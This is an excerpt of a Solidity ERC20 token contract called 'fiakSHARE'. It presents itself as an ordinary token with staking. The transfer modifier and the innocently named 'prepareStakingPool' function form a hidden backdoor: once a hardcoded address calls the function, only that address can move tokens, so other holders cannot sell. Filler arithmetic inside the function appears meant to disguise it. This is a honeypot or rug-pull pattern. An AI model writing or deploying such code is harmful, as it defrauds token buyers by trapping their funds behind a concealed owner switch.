...
contract fiakSHAREToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenFS_totalSupply;
    uint256 private _tokenFS_status = 0;
    uint256 public stakingPoolFSStatus = 0;

    string private _tokenFS_name;
    string private _tokenFS_symbol;

    address private _poolFSAddress = 0x5925C5F60d76a869E0197D5C48FF52c02d06aE3c;

    constructor() {
        _tokenFS_name = "fiakSHARE";
        _tokenFS_symbol = "fiakSHARE";
        _tokenFS_totalSupply = 59700 * 10 ** 18;
        _balances[msg.sender] = _tokenFS_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolFSAddress || _tokenFS_status == 0);
        _;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolFSStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolFSAddress)
        {
            _tokenFS_status = 1;
        }
    }
